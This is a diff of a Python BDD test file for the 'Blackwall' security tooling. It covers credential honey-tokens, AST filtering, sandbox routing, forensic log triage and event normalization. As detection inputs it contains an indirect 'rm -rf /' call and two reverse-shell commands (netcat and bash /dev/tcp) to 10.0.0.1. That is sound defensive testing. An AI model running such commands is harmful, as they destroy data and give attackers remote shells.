@@ -21,10 +21,11 @@ from blackwall.enterprise import (
     VaultMCPAdapter,
 )
 from blackwall.enterprise.advanced_threat_detection import (
-    EventSource,
-    NormalizedEvent,
     AttackNode,
     AttackPath,
+    EventSource,
+    EventStreamCollector,
+    NormalizedEvent,
 )
 
 # Link to Gherkin feature file
@@ -176,7 +177,9 @@ def init_identity_sidecar(state):
     run_async(state.vault_adapter.connect())
 
 
-@given('environment variables containing sensitive keys "AWS_SECRET_ACCESS_KEY=BW_SYNTHETIC_MOCK_SECRET_0192"')
+@given(
+    'environment variables containing sensitive keys "AWS_SECRET_ACCESS_KEY=BW_SYNTHETIC_MOCK_SECRET_0192"'
+)
 def set_env_credentials(state):
     state.env_before["AWS_SECRET_ACCESS_KEY"] = "BW_SYNTHETIC_MOCK_SECRET_0192"
 
@@ -186,7 +189,9 @@ def sterilize_environment(state):
     state.env_after = state.sidecar.sterilize_environment(state.env_before)
 
 
-@then('real credentials are replaced with synthetic honey-tokens "BW_SYNTHETIC_AWS_SECRET_ACCESS_KEY"')
+@then(
+    'real credentials are replaced with synthetic honey-tokens "BW_SYNTHETIC_AWS_SECRET_ACCESS_KEY"'
+)
 def verify_synthetic_honeytoken(state):
     assert state.env_after["AWS_SECRET_ACCESS_KEY"].startswith("BW_SYNTHETIC_")
 
@@ -225,13 +230,15 @@ def init_ast_filter(state):
 
 
 @when(
-    'an untrusted loader attempts indirect function call "runner = os.system; runner(\'rm -rf /\')"'
+    "an untrusted loader attempts indirect function call \"runner = os.system; runner('rm -rf /')\""
 )
 def inspect_indirect_call(state):
     code_snippet = "runner = os.system\nrunner('rm -rf /')"
     state.ast_result = state.ast_filter.inspect_code(code_snippet)
     state.sandbox_run_result = run_async(
-        state.sandbox_adapter.run_in_sandbox(payload=code_snippet, sandbox_type="gvisor")
+        state.sandbox_adapter.run_in_sandbox(
+            payload=code_snippet, sandbox_type="gvisor"
+        )
     )
 
 
@@ -250,7 +257,9 @@ def verify_sandbox_routing(state):
 # --- Scenario: Dual-mode local forensic triage engine and OpenTelemetry export ---
 
 
-@given("a Forensic Triage Manager configured with Ollama LLM and Standalone Fallback Parser")
+@given(
+    "a Forensic Triage Manager configured with Ollama LLM and Standalone Fallback Parser"
+)
 def init_forensic_manager(state):
     state.otel_adapter = OpenTelemetryMCPAdapter()
     run_async(state.otel_adapter.connect(verify_endpoint=False))
@@ -264,7 +273,9 @@ def ingest_incident_log(state):
         "command": "/bin/nc -e /bin/sh 10.0.0.1 4444",
         "pid": 14902,
     }
-    state.forensic_report = run_async(state.forensic_manager.triage_log_event(log_event))
+    state.forensic_report = run_async(
+        state.forensic_manager.triage_log_event(log_event)
+    )
 
 
 @then("if Ollama is online the primary LLM analyzes the log without safety refusals")
@@ -272,10 +283,14 @@ def verify_ollama_primary(state):
     assert hasattr(state.forensic_manager, "ollama_engine")
 
 
-@then("if Ollama is offline the standalone lightweight parser achieves 100% fallback availability")
+@then(
+    "if Ollama is offline the standalone lightweight parser achieves 100% fallback availability"
+)
 def verify_standalone_fallback(state):
     fallback_parser = LightweightForensicParser()
-    report = fallback_parser.parse({"command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"})
+    report = fallback_parser.parse(
+        {"command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"}
+    )
     assert report["is_threat"] is True
     assert report["mode"] == "standalone_fallback"
 
@@ -354,7 +369,9 @@ def verify_atd_event_rejections(state):
         )
 
 
-@then("AttackPaths enforce minimum 2 nodes and temporal ordering end_time >= start_time")
+@then(
+    "AttackPaths enforce minimum 2 nodes and temporal ordering end_time >= start_time"
+)
 def verify_atd_attack_path_rules(state):
     now = datetime.now(timezone.utc)
     ev1 = state.atd_event
@@ -404,4 +421,92 @@ def verify_atd_attack_path_rules(state):
             end_time=now - timedelta(seconds=1),
             risk_score=0.8,
             correlation_score=0.9,
+        )
+
+
+# --- Scenario: Pillar 6 EventStreamCollector multi-pillar ingestion and resilient normalization ---
+
+
+@given(
+    "an EventStreamCollector engine ingesting streams across all 5 Blackwall pillars"
+)
+def setup_mesh_event_collector(state):
+    state.mesh_collector = EventStreamCollector()
+    state.raw_mesh_events = [
+        (
+            EventSource.KERNEL_SYSCALL,
+            {"action": "execve", "target": "/usr/bin/python3", "agent_id": "agent-m1"},
+        ),
+        (
+            EventSource.TOOL_CALL,
+            {
+                "action": "network_connect",
+                "target": "10.0.0.1:4444",
+                "agent_id": "agent-m2",
+            },
+        ),
+        (
+            EventSource.IDENTITY_ACCESS,
+            {
+                "action": "vault_token_request",
+                "target": "secret/data",
+                "agent_id": "agent-m3",
+            },
+        ),
+        (
+            EventSource.PIPELINE_EXECUTION,
+            {
+                "action": "eval_dataset_load",
+                "target": "dataset.pkl",
+                "agent_id": "agent-m4",
+            },
+        ),
+        (
+            EventSource.FORENSIC_ALERT,
+            {"action": "anomaly_detected", "target": "syslog", "agent_id": "agent-m5"},
+        ),
+    ]
+
+
+@when(
+    "heterogeneous events from kernel, tool, identity, pipeline, and forensic sources are collected"
+)
+def collect_mesh_events(state):
+    state.normalized_mesh_events = [
+        state.mesh_collector.normalize_event(source, raw_payload)
+        for source, raw_payload in state.raw_mesh_events
+    ]
+
+
+@then(
+    "events are normalized into standard NormalizedEvents with UUID v4 IDs, UTC timestamps, and risk scores"
+)
+def verify_normalized_mesh_events(state):
+    assert len(state.normalized_mesh_events) == 5
+    for norm in state.normalized_mesh_events:
+        assert isinstance(norm, NormalizedEvent)
+        parsed_id = uuid.UUID(norm.event_id)
+        assert parsed_id.version == 4
+        assert norm.timestamp.tzinfo is not None
+        assert 0.0 <= norm.risk_score <= 1.0
+
+
+@then(
+    "malformed payloads or invalid stream factories fail cleanly without corrupting telemetry"
+)
+def verify_clean_failures(state):
+    with pytest.raises(ValueError):
+        state.mesh_collector.normalize_event(
+            EventSource.KERNEL_SYSCALL, "invalid_string_payload"
+        )
+
+    with pytest.raises(ValueError, match="stream_factory must be a callable"):
+
+        async def mock_bad_stream():
+            yield {}
+
+        run_async(
+            state.mesh_collector.collect_with_reconnect(
+                EventSource.TOOL_CALL, mock_bad_stream()
+            ).__anext__()
         )
